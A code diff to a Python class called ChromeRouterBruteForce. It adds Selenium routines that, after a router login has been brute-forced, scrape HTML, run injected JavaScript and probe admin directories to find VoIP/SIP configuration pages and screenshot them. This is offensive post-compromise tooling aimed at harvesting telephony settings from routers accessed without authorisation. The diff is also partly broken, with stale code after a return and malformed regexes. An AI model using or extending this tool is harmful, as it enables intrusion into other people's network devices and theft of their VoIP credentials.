@@ -1324,8 +1324,176 @@ class ChromeRouterBruteForce:
             print(f"{Colors.RED}[!] Error getting brand-specific paths: {e}{Colors.END}")
             return []
     
+    def extract_hidden_links_from_html(self):
+        """Extract hidden links and JavaScript-generated content from HTML source"""
+        try:
+            print(f"{Colors.CYAN}[*] Extracting hidden links from HTML source...{Colors.END}")
+            
+            # Get page source
+            page_source = self.driver.page_source
+            
+            # Extract all possible links using regex patterns
+            import re
+            
+            # Pattern 1: href attributes
+            href_pattern = r'href=["\']([^"\']*voip[^"\']*|sip[^"\']*|voice[^"\']*|telephony[^"\']*|phone[^"\']*)["\']'
+            href_matches = re.findall(href_pattern, page_source, re.IGNORECASE)
+            
+            # Pattern 2: onclick attributes with URLs
+            onclick_pattern = r'onclick=["\'][^"\']*["\'"]?([^"\']*voip[^"\']*|sip[^"\']*|voice[^"\']*|telephony[^"\']*|phone[^"\']*)["\'"]?'
+            onclick_matches = re.findall(onclick_pattern, page_source, re.IGNORECASE)
+            
+            # Pattern 3: JavaScript variables with URLs
+            js_pattern = r'["\'"]([^"\']*voip[^"\']*|sip[^"\']*|voice[^"\']*|telephony[^"\']*|phone[^"\']*)["\']'
+            js_matches = re.findall(js_pattern, page_source, re.IGNORECASE)
+            
+            # Pattern 4: Form actions
+            form_pattern = r'action=["\']([^"\']*voip[^"\']*|sip[^"\']*|voice[^"\']*|telephony[^"\']*|phone[^"\']*)["\']'
+            form_matches = re.findall(form_pattern, page_source, re.IGNORECASE)
+            
+            # Pattern 5: AJAX URLs
+            ajax_pattern = r'["\'"]([^"\']*ajax[^"\']*voip[^"\']*|ajax[^"\']*sip[^"\']*|ajax[^"\']*voice[^"\']*|ajax[^"\']*telephony[^"\']*|ajax[^"\']*phone[^"\']*)["\']'
+            ajax_matches = re.findall(ajax_pattern, page_source, re.IGNORECASE)
+            
+            all_matches = href_matches + onclick_matches + js_matches + form_matches + ajax_matches
+            
+            # Clean and deduplicate
+            clean_matches = []
+            for match in all_matches:
+                if match and match.startswith(('/', 'http', 'javascript:')):
+                    clean_matches.append(match)
+            
+            unique_matches = list(set(clean_matches))
+            
+            print(f"{Colors.GREEN}[+] Found {len(unique_matches)} hidden links in HTML source{Colors.END}")
+            for match in unique_matches[:10]:  # Show first 10
+                print(f"{Colors.BLUE}[*] Hidden link: {match}{Colors.END}")
+            
+            return unique_matches
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error extracting hidden links: {e}{Colors.END}")
+            return []
+    
+    def execute_javascript_for_links(self):
+        """Execute JavaScript to find dynamically generated links"""
+        try:
+            print(f"{Colors.CYAN}[*] Executing JavaScript to find dynamic links...{Colors.END}")
+            
+            # JavaScript code to find all possible links
+            js_code = """
+            var links = [];
+            var voipKeywords = ['voip', 'sip', 'voice', 'telephony', 'phone', 'fax', 'pbx', 'trunk', 'call', 'dial'];
+            
+            // Find all elements with href
+            var hrefElements = document.querySelectorAll('[href]');
+            for (var i = 0; i < hrefElements.length; i++) {
+                var href = hrefElements[i].href;
+                if (href && voipKeywords.some(keyword => href.toLowerCase().includes(keyword))) {
+                    links.push(href);
+                }
+            }
+            
+            // Find all elements with onclick
+            var onclickElements = document.querySelectorAll('[onclick]');
+            for (var i = 0; i < onclickElements.length; i++) {
+                var onclick = onclickElements[i].onclick.toString();
+                if (onclick && voipKeywords.some(keyword => onclick.toLowerCase().includes(keyword))) {
+                    links.push(onclick);
+                }
+            }
+            
+            // Find all form actions
+            var forms = document.querySelectorAll('form');
+            for (var i = 0; i < forms.length; i++) {
+                var action = forms[i].action;
+                if (action && voipKeywords.some(keyword => action.toLowerCase().includes(keyword))) {
+                    links.push(action);
+                }
+            }
+            
+            // Find all JavaScript functions that might contain VoIP links
+            var scripts = document.querySelectorAll('script');
+            for (var i = 0; i < scripts.length; i++) {
+                var scriptContent = scripts[i].innerHTML;
+                if (scriptContent && voipKeywords.some(keyword => scriptContent.toLowerCase().includes(keyword))) {
+                    // Extract URLs from script content
+                    var urlMatches = scriptContent.match(/["\'"]([^"\']*voip[^"\']*|sip[^"\']*|voice[^"\']*|telephony[^"\']*|phone[^"\']*)["\']/gi);
+                    if (urlMatches) {
+                        links = links.concat(urlMatches);
+                    }
+                }
+            }
+            
+            return links;
+            """
+            
+            # Execute JavaScript
+            js_links = self.driver.execute_script(js_code)
+            
+            print(f"{Colors.GREEN}[+] JavaScript found {len(js_links)} dynamic links{Colors.END}")
+            for link in js_links[:10]:  # Show first 10
+                print(f"{Colors.BLUE}[*] Dynamic link: {link}{Colors.END}")
+            
+            return js_links
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error executing JavaScript: {e}{Colors.END}")
+            return []
+    
+    def scan_common_directories(self, base_url):
+        """Scan common directory patterns for VoIP/SIP pages"""
+        try:
+            print(f"{Colors.CYAN}[*] Scanning common directory patterns...{Colors.END}")
+            
+            # Common directory patterns
+            directory_patterns = [
+                "/admin/", "/config/", "/settings/", "/system/", "/advanced/", "/network/",
+                "/management/", "/control/", "/panel/", "/interface/", "/web/", "/cgi/",
+                "/cgi-bin/", "/scripts/", "/tools/", "/utilities/", "/maintenance/",
+                "/diagnostics/", "/monitoring/", "/status/", "/info/", "/help/", "/support/"
+            ]
+            
+            voip_keywords = ["voip", "sip", "voice", "telephony", "phone", "fax", "pbx", "trunk", "call", "dial"]
+            
+            found_directories = []
+            
+            for pattern in directory_patterns:
+                try:
+                    test_url = f"{base_url.rstrip('/')}{pattern}"
+                    print(f"{Colors.BLUE}[*] Testing directory: {test_url}{Colors.END}")
+                    
+                    # Navigate to directory
+                    self.driver.get(test_url)
+                    time.sleep(1)
+                    
+                    # Check if page loaded successfully
+                    if "404" not in self.driver.title.lower() and "not found" not in self.driver.page_source.lower():
+                        # Look for VoIP-related content
+                        page_source = self.driver.page_source.lower()
+                        for keyword in voip_keywords:
+                            if keyword in page_source:
+                                found_directories.append(test_url)
+                                print(f"{Colors.GREEN}[+] Found VoIP content in: {test_url}{Colors.END}")
+                                break
+                    
+                    # Go back to admin panel
+                    self.driver.back()
+                    time.sleep(1)
+                    
+                except Exception as e:
+                    print(f"{Colors.RED}[!] Error testing directory {pattern}: {e}{Colors.END}")
+                    continue
+            
+            print(f"{Colors.GREEN}[+] Found {len(found_directories)} directories with VoIP content{Colors.END}")
+            return found_directories
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error scanning directories: {e}{Colors.END}")
+            return []
+    
     def search_voip_after_success(self, login_url, username, password):
-        """Search for VoIP/SIP pages after successful login"""
+        """Search for VoIP/SIP pages after successful login using new methods"""
         try:
             print(f"{Colors.CYAN}[*] Searching for VoIP/SIP configuration pages after successful login...{Colors.END}")
             
@@ -1334,38 +1502,99 @@ class ChromeRouterBruteForce:
             parsed_url = urlparse(login_url)
             base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
             
-            # Step 1: Identify router brand and model
-            brands, models, footer_info, device_info = self.identify_router_brand()
-            
-            # Step 2: Get brand-specific VoIP/SIP paths
-            voip_paths = self.get_brand_specific_voip_paths(brands)
-            
-            print(f"{Colors.BLUE}[*] Starting intelligent VoIP/SIP search...{Colors.END}")
+            print(f"{Colors.BLUE}[*] Starting advanced VoIP/SIP search...{Colors.END}")
             
             screenshots_taken = []
             
-            # Method 1: Try brand-specific and generic VoIP/SIP paths
-            print(f"{Colors.BLUE}[*] Method 1: Testing brand-specific VoIP/SIP paths...{Colors.END}")
+            # Method 1: Extract hidden links from HTML source
+            print(f"{Colors.BLUE}[*] Method 1: Extracting hidden links from HTML source...{Colors.END}")
+            hidden_links = self.extract_hidden_links_from_html()
             
-            if not voip_paths:
-                # Fallback to generic paths if brand detection failed
-                voip_paths = [
-                    "/voip", "/sip", "/voice", "/telephony", "/phone", "/fax",
-                    "/advanced/voip", "/advanced/sip", "/advanced/voice", "/advanced/telephony",
-                    "/network/voip", "/network/sip", "/network/voice", "/network/telephony",
-                    "/admin/voip", "/admin/sip", "/admin/voice", "/admin/telephony",
-                    "/config/voip", "/config/sip", "/config/voice", "/config/telephony",
-                    "/settings/voip", "/settings/sip", "/settings/voice", "/settings/telephony",
-                    "/system/voip", "/system/sip", "/system/voice", "/system/telephony",
-                    "/voip.html", "/sip.html", "/voice.html", "/telephony.html", "/phone.html",
-                    "/advanced_voip.html", "/advanced_sip.html", "/voip_config.html", "/sip_config.html",
-                    "/voip_configuration.html", "/sip_configuration.html", "/voice_config.html",
-                    "/phone_config.html", "/telephony_config.html", "/pbx.html", "/trunk.html",
-                    "/call_routing.html", "/extension.html", "/gateway.html", "/proxy.html",
-                    "/call_forwarding.html", "/voicemail.html", "/conference.html", "/hold.html",
-                    "/dial_plan.html", "/codec.html", "/dtmf.html", "/ringtone.html",
-                    "/call_transfer.html", "/call_waiting.html", "/caller_id.html"
-                ]
+            # Method 2: Execute JavaScript to find dynamic links
+            print(f"{Colors.BLUE}[*] Method 2: Executing JavaScript for dynamic links...{Colors.END}")
+            dynamic_links = self.execute_javascript_for_links()
+            
+            # Method 3: Scan common directories
+            print(f"{Colors.BLUE}[*] Method 3: Scanning common directory patterns...{Colors.END}")
+            found_directories = self.scan_common_directories(base_url)
+            
+            # Combine all found links
+            all_links = hidden_links + dynamic_links + found_directories
+            
+            # Remove duplicates
+            unique_links = list(set(all_links))
+            
+            print(f"{Colors.GREEN}[+] Total unique links found: {len(unique_links)}{Colors.END}")
+            
+            # Test each unique link
+            for i, link in enumerate(unique_links):
+                try:
+                    print(f"{Colors.BLUE}[*] Testing link {i+1}/{len(unique_links)}: {link}{Colors.END}")
+                    
+                    # Navigate to link
+                    if link.startswith('http'):
+                        self.driver.get(link)
+                    elif link.startswith('/'):
+                        self.driver.get(f"{base_url.rstrip('/')}{link}")
+                    else:
+                        continue
+                    
+                    time.sleep(2)
+                    
+                    # Check for VoIP/SIP content
+                    if self.is_voip_sip_page():
+                        screenshot_path = self.take_screenshot(login_url, f"voip_sip_{i+1}")
+                        screenshots_taken.append(screenshot_path)
+                        print(f"{Colors.GREEN}[+] VoIP/SIP page found: {link}{Colors.END}")
+                    
+                    # Go back to admin panel
+                    self.driver.back()
+                    time.sleep(1)
+                    
+                except Exception as e:
+                    print(f"{Colors.RED}[!] Error testing link {link}: {e}{Colors.END}")
+                    continue
+            
+            if screenshots_taken:
+                print(f"{Colors.GREEN}[+] Found {len(screenshots_taken)} VoIP/SIP pages!{Colors.END}")
+                return screenshots_taken
+            else:
+                print(f"{Colors.RED}[!] No VoIP/SIP pages found{Colors.END}")
+                return []
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error in advanced VoIP search: {e}{Colors.END}")
+            return []
+    
+    def is_voip_sip_page(self):
+        """Check if current page contains VoIP/SIP content"""
+        try:
+            page_source = self.driver.page_source.lower()
+            title = self.driver.title.lower()
+            
+            voip_indicators = [
+                'voip', 'sip', 'voice', 'telephony', 'phone', 'fax', 'pbx', 'trunk',
+                'call routing', 'extension', 'gateway', 'proxy', 'call forwarding',
+                'voicemail', 'conference', 'hold', 'dial plan', 'codec', 'dtmf',
+                'ringtone', 'call transfer', 'call waiting', 'caller id',
+                'sip proxy', 'sip server', 'voip server', 'phone system',
+                'call manager', 'unified communications', 'voice gateway',
+                'dial peer', 'voice port', 'voice interface', 'voice translation',
+                'voice route', 'voice dial', 'voice call', 'voice mail',
+                'sip trunk', 'sip gateway', 'sip proxy', 'sip server',
+                'voip gateway', 'voip proxy', 'voip server', 'voip trunk'
+            ]
+            
+            # Check title and content
+            for indicator in voip_indicators:
+                if indicator in title or indicator in page_source:
+                    return True
+            
+            return False
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error checking VoIP/SIP content: {e}{Colors.END}")
+            return False
             
             for i, path in enumerate(voip_paths):
                 try:
